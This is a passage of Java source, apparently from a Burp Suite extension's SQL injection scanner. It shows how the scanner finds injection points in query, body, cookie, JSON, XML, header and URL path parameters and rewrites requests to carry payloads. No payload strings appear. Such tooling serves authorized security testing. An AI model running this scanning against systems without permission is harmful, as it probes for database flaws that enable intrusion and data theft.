                            "(<" + Pattern.quote(ip.name) + "(?:\\s[^>]*)?>)" + Pattern.quote(ip.originalValue)
                                    + "(</" + Pattern.quote(ip.name) + ">)",
                            "$1" + Matcher.quoteReplacement(xmlEscaped) + "$2");
                }
                return request.withBody(newXml);
            case HEADER:
                return request.withRemovedHeader(ip.name).withAddedHeader(ip.name, payload);
            case PATH_SEGMENT:
                return injectPathSegmentPayload(request, ip.name, payload);
            default:
                return request;
        }
    }

    /**
     * Inject a payload into a URL path segment, replacing the segment identified by name.
     * The target name format is "path:INDEX:ORIGINAL_VALUE".
     */
    private HttpRequest injectPathSegmentPayload(HttpRequest request, String targetName, String payload) {
        try {
            String[] parts = targetName.split(":", 3);
            if (parts.length < 3) return request;
            int segmentIndex = Integer.parseInt(parts[1]);

            String path = extractPath(request.url());
            String[] segments = path.split("/");

            if (segmentIndex < 0 || segmentIndex >= segments.length) return request;

            segments[segmentIndex] = PayloadEncoder.encode(payload);
            String newPath = String.join("/", segments);

            // Preserve query string if present
            String fullPath = request.path();
            int queryIdx = fullPath.indexOf('?');
            if (queryIdx >= 0) {
                newPath = newPath + fullPath.substring(queryIdx);
            }

            return request.withPath(newPath);
        } catch (Exception e) {
            api.logging().logToError("[SQLi] injectPathSegmentPayload failed: " + e.getMessage());
            return request;
        }
    }

    private List<InjectionPoint> extractInjectionPoints(HttpRequest request) {
        List<InjectionPoint> points = new ArrayList<>();

        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.QUERY));
                    break;
                case BODY:
                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.BODY));
                    break;
                case COOKIE:
                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.COOKIE));
                    break;
            }
        }

        // JSON body parameters
        String contentType = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                contentType = h.value();
                break;
            }
        }
        if (contentType.toLowerCase(Locale.ROOT).contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null && !body.isBlank()) {
                    for (JsonScanSupport.Target target : JsonScanSupport.extractTargets(body)) {
                        points.add(new InjectionPoint(target.displayName(), target.value(),
                                InjectionType.JSON, target.path()));
                    }
                }
            } catch (Exception ignored) {
            }
        }

        // XML body parameters
        if (contentType.contains("/xml") || contentType.contains("+xml")) {
            try {
                String body = request.bodyToString();
                if (body != null && !body.isBlank() && body.trim().startsWith("<")) {
                    extractXmlParams(body, points);
                }
            } catch (Exception ignored) {}
        }

        // Extract ALL injectable request headers (skip non-injectable framework headers)
        Set<String> skipHeaders = Set.of("host", "content-length", "connection", "accept-encoding",
                "sec-fetch-mode", "sec-fetch-site", "sec-fetch-dest", "sec-fetch-user",
                "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                "upgrade-insecure-requests", "if-modified-since", "if-none-match",
                "authorization", "proxy-authorization", "content-type", "accept",
                "accept-language", "cache-control", "pragma", "origin",
                "cookie"); // individual cookies already extracted as COOKIE parameters
        for (var h : request.headers()) {
            if (!skipHeaders.contains(h.name().toLowerCase())) {
                points.add(new InjectionPoint(h.name(), h.value(), InjectionType.HEADER));
            }
        }

        // URL path segments — API endpoints like /api/users/12 where 12 may be used in SQL queries
        if (config.getBool("sqli.pathSegments.enabled", true)) {
            extractPathSegmentTargets(request, points);
        }

        return points;
    }

    // XML extraction patterns
    private static final Pattern XML_ELEMENT_PATTERN =
            Pattern.compile("<([a-zA-Z][a-zA-Z0-9_:.-]*)(?:\\s[^>]*)?>([^<]+)</\\1>");
    private static final Pattern XML_ATTR_PATTERN =
            Pattern.compile("([a-zA-Z][a-zA-Z0-9_:.-]*)\\s*=\\s*\"([^\"]*)\"");

    private void extractXmlParams(String xmlBody, List<InjectionPoint> points) {
        Set<String> seen = new HashSet<>();

        // Extract text content of elements: <tagName>value</tagName>
        Matcher m = XML_ELEMENT_PATTERN.matcher(xmlBody);
        while (m.find()) {
            String name = m.group(1);
            String value = m.group(2).trim();
            if (!value.isEmpty() && !seen.contains("elem:" + name)) {
                seen.add("elem:" + name);
                points.add(new InjectionPoint(name, value, InjectionType.XML));
            }
        }

        // Extract attribute values (skip xmlns and standard XML attrs)
        Matcher am = XML_ATTR_PATTERN.matcher(xmlBody);
        while (am.find()) {
            String attrName = am.group(1);
            String attrValue = am.group(2).trim();
            if (!attrValue.isEmpty() && !attrName.startsWith("xmlns")
                    && !attrName.equals("encoding") && !attrName.equals("version")
                    && !seen.contains("attr:" + attrName)) {
                seen.add("attr:" + attrName);
                points.add(new InjectionPoint("@" + attrName, attrValue, InjectionType.XML));
            }
        }
    }

    // Common route words to skip when extracting path segment targets
    private static final Set<String> COMMON_ROUTE_WORDS = Set.of(
            "api", "v1", "v2", "v3", "v4", "search", "users", "admin", "static", "assets",
            "css", "js", "img", "public", "login", "logout", "register", "profile",
            "settings", "dashboard", "results", "page", "index", "home", "about",
            "contact", "auth", "oauth", "callback", "webhook", "health", "status",
            "docs", "help", "faq", "terms", "privacy", "legal", "blog", "news",
            "feed", "rss", "sitemap", "robots", "favicon", "manifest"
    );

    /**
     * Extract the last URL path segment as a SQL injection target.
     * Only targets API-style endpoints (e.g., /api/users/12, /api/orders/abc-123).
     * Skips regular page URLs ending in file extensions like .html, .php, .jsp, etc.
     */
    private void extractPathSegmentTargets(HttpRequest request, List<InjectionPoint> points) {
        try {
            String path = extractPath(request.url());
            if (path == null || path.length() < 2) return;

            // Skip URLs that end with a page/static file extension — not API endpoints
            if (path.matches(".*\\.(html|htm|php|asp|aspx|jsp|jspx|css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|pdf|xml|txt)$")) return;

            String[] segments = path.split("/");

            // Find the last non-empty segment
            int lastIdx = -1;
            String lastSegment = null;
            for (int i = segments.length - 1; i >= 0; i--) {
                String seg = segments[i].trim();
                if (!seg.isEmpty()) {
                    lastIdx = i;
                    lastSegment = seg;
                    break;
                }
            }
            if (lastIdx < 0 || lastSegment == null) return;

            // Skip if last segment is a common route word (not a user-controlled value)
            if (COMMON_ROUTE_WORDS.contains(lastSegment.toLowerCase())) return;

            // The last segment should look like a parameter value (ID, UUID, slug)
            boolean isNumeric = lastSegment.matches("^\\d+$");
            boolean isUuid = lastSegment.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
            boolean isAlphanumericId = lastSegment.matches("^[a-zA-Z0-9_-]+$") && lastSegment.length() >= 3;

            if (isNumeric || isUuid || isAlphanumericId) {
                String targetName = "path:" + lastIdx + ":" + lastSegment;
                points.add(new InjectionPoint(targetName, lastSegment, InjectionType.PATH_SEGMENT));
            }
        } catch (Exception e) {
            api.logging().logToError("[SQLi] Path segment extraction failed: " + e.getMessage());
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) {
                url = url.substring(url.indexOf("://") + 3);
            }
            int slashIdx = url.indexOf('/');
            if (slashIdx >= 0) {
                int queryIdx = url.indexOf('?', slashIdx);
                return queryIdx >= 0 ? url.substring(slashIdx, queryIdx) : url.substring(slashIdx);
            }
        } catch (Exception ignored) {
        }
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("sqli.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private boolean isOobConfirmed(HttpRequestResponse original, InjectionPoint ip) {
        // An explicit manual rescan must not be short-circuited by a previous callback.
        if (dedup != null && dedup.isBypass()) return false;
        return oobConfirmedTargets.contains(scanTargetKey(original.request(), ip));
    }

    private static String scanTargetKey(HttpRequest request, InjectionPoint ip) {
        return ScanTargetIdentity.build(request.url(), request.method(), ip.type.name(), ip.identityName());
    }

    @Override
    public void destroy() {
        tested.clear();
        oobConfirmedTargets.clear();
        fingerprintCache.clear();
        fingerprintLatches.clear();
    }

    // Inner types
    private enum InjectionType { QUERY, BODY, COOKIE, JSON, HEADER, XML, PATH_SEGMENT }

    private static class InjectionPoint {
        final String name;
        final String originalValue;
        final InjectionType type;
        final List<Object> jsonPath;

        InjectionPoint(String name, String originalValue, InjectionType type) {
            this(name, originalValue, type, null);
        }

        InjectionPoint(String name, String originalValue, InjectionType type, List<Object> jsonPath) {
            this.name = name;
            this.originalValue = originalValue != null ? originalValue : "";
            this.type = type;
            this.jsonPath = jsonPath == null ? null : List.copyOf(jsonPath);
        }

        String identityName() {
            if (jsonPath == null) return name;
            StringBuilder out = new StringBuilder();
            for (Object part : jsonPath) {
                if (part instanceof String key) {
                    out.append('/').append(key.replace("~", "~0").replace("/", "~1"));
                } else {
                    out.append('/').append(part);
                }
            }
            return out.toString();
        }

        boolean matchesParameterName(String requested) {
            if (requested == null) return false;
            if (name.equalsIgnoreCase(requested)) return true;
            if (jsonPath != null && !jsonPath.isEmpty()
                    && jsonPath.get(jsonPath.size() - 1) instanceof String key) {
                return key.equalsIgnoreCase(requested);
            }
            return false;
        }
    }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
